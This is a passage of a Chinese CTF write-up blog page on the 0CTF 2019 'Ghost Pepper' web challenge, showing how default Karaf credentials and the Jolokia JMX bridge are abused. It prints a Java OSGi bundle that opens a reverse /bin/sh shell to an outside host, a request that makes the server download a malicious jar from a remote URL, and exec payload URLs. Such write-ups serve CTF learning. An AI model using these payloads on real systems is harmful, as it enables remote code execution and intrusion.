@@ -1,0 +1,338 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>0CTF Web writeup [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        0CTF Web writeup
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-03-31T02:56:21.000Z">
+        2019-03-31
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <p>本次writeup，纯属复现 : )</p>
+<h2 id="0x01-Ghost-Pepper"><a href="#0x01-Ghost-Pepper" class="headerlink" title="0x01 Ghost Pepper"></a>0x01 Ghost Pepper</h2><p><a href="http://111.186.63.207:31337/" target="_blank" rel="noopener">题目地址</a></p>
+<p>访问题目，提示该站点是Karaf，需要输入用户名和密码：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/1.png" alt=""></p>
+<p>Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去后是个404页面：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/2.png" alt=""></p>
+<p>页面显示是使用Jetty作为Web服务器的，除此之外没找到更多的信息。</p>
+<p>搜一下题目Ghost pepper，在Wiki百科发现其别名为Bhut jolokia，然后再搜索一遍Bhut jolokia，发现Jolokia是一个JMX-HTTP桥接器，可替代JSR-160连接器。它是一种基于代理的方法，支持许多平台。除了基本的JMX操作之外，它还通过批量请求和细粒度安全策略等独特功能增强了JMX远程处理功能。</p>
+<p>那就是说，该站点应该支持Jolokia，访问一下该路径看看，果然返回了Json格式的数据：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/3.png" alt=""></p>
+<p>访问list，列出Jolokia所支持的所有操作：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/4.png" alt=""></p>
+<p>这里只列下前面的Java类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">java.util.logging</span><br><span class="line">org.eclipse.jetty.server.session</span><br><span class="line">org.ops4j.pax.web.service.jetty.internal</span><br><span class="line">org.eclipse.jetty.jmx</span><br><span class="line">osgi.compendium</span><br><span class="line">java.nio</span><br><span class="line">org.apache.karaf</span><br><span class="line">JMImplementation</span><br><span class="line">org.eclipse.jetty.util.thread</span><br><span class="line">java.lang</span><br><span class="line">com.sun.management</span><br><span class="line">jmx4perl</span><br><span class="line">connector</span><br><span class="line">sun.nio.ch</span><br><span class="line">org.eclipse.jetty.server</span><br><span class="line">org.apache.aries.blueprint</span><br><span class="line">org.eclipse.jetty.io</span><br><span class="line">osgi.core</span><br><span class="line">jolokia</span><br></pre></td></tr></table></figure>
+<p>注意到org.apache.karaf这个类，就是说我们可以通过Karaf JMX执行各种操作。下面就来找下该karaf类所支持的所有方法：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/5.png" alt=""></p>
+<p>其中可以看到很多操作命名为install，因此我们可以利用这些API来加载安装并部署我们直接编写的恶意jar程序。</p>
+<p>下面有两种方法来解它。</p>
+<h3 id="Method1——安装WebConsole"><a href="#Method1——安装WebConsole" class="headerlink" title="Method1——安装WebConsole"></a>Method1——安装WebConsole</h3><p>Karaf框架是拥有一个WebConsole的，可以通过Web端进行控制台的交互，前面我们获取了org.apache.karaf的所有支持的方法，找到其中的installFeature()，编写如下安装WebConsole的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/0CTF-Web-writeup/6.png" alt=""></p>
+<p>然后在URL栏访问Karaf的WebConsole界面，直接输入命令即可得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/system/console/gogo</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/0CTF-Web-writeup/7.png" alt=""></p>
+<h3 id="Method2——安装恶意bundle"><a href="#Method2——安装恶意bundle" class="headerlink" title="Method2——安装恶意bundle"></a>Method2——安装恶意bundle</h3><p>在之前的org.apache.karaf类中，还可以参考<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">这篇文章</a>通过install方法来进行利用。</p>
+<p>除了该类外，还可以通过osgi.core的installBundleFromURL，这个方法可以通过URL来安装bundle，我们可以通过如下的方法找到该方法：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/8.png" alt=""></p>
+<p>此时我们可以构造一个恶意bundle打包成jar放置在我们自己的服务器中，然后访问Karaf服务让其下载并安装部署我们的恶意bundle从而实现反弹shell：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleActivator;</span><br><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Activator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">BundleActivator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str = <span class="string">"1.2.3.4"</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        Socket localSocket = <span class="keyword">new</span> Socket(str, i);</span><br><span class="line"></span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line"><span class="comment">// localSocket.close();</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            String ShellPath;</span><br><span class="line">            ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket( str, i );</span><br><span class="line">            Process process = Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line">        localSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"RIP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取一下该类的uuid：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/9.png" alt=""></p>
+<p>然后通过installBundleFromURL方法来下载安装恶意bundle：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia/list HTTP/1.1</span><br><span class="line">Host: 111.186.63.207:31337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic a2FyYWY6a2FyYWY=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: JSESSIONID=h1fouerlv92j1nzj1rn7f4hyu</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;exec&quot;,</span><br><span class="line">  &quot;mbean&quot;: &quot;osgi.core:framework=org.eclipse.osgi,type=framework,uuid=089717e7-f953-42ec-959f-cd2488bc6482,version=1.7&quot;,</span><br><span class="line">  &quot;operation&quot;: &quot;installBundleFromURL&quot;,</span><br><span class="line">  &quot;arguments&quot;: [</span><br><span class="line">    &quot;moxiaoxi&quot;,</span><br><span class="line">    &quot;http://a.com:666/m7.jar&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过response的id，来启动bundle，就可以获得一个反弹shell：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"type"</span>: <span class="string">"exec"</span>, <span class="attr">"mbean"</span>: <span class="string">"osgi.core:framework=org.eclipse.osgi,type=framework,version=1.7,uuid=089717e7-f953-42ec-959f-cd2488bc6482"</span>, <span class="attr">"operation"</span>: <span class="string">"startBundle"</span>, <span class="attr">"arguments"</span>: [ <span class="string">"93"</span> ] &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Wallbreaker-Easy"><a href="#0x02-Wallbreaker-Easy" class="headerlink" title="0x02 Wallbreaker Easy"></a>0x02 Wallbreaker Easy</h2><p><a href="http://111.186.63.208:31340" target="_blank" rel="noopener">题目地址</a>，已关闭。</p>
+<p>环境待复现…</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">TCTF2019 Web WP</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Ghost-Pepper"><span class="toc-text">0x01 Ghost Pepper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method1——安装WebConsole"><span class="toc-text">Method1——安装WebConsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method2——安装恶意bundle"><span class="toc-text">Method2——安装恶意bundle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Wallbreaker-Easy"><span class="toc-text">0x02 Wallbreaker Easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/03/29/Securinets-CTF-Web-writeup/" rel="next" title="Securinets CTF Web writeup">
+          Securinets CTF Web writeup
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/" rel="prev" title="浅析Spring Data Rest之cve-2017-8046">
+            浅析Spring Data Rest之cve-2017-8046
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
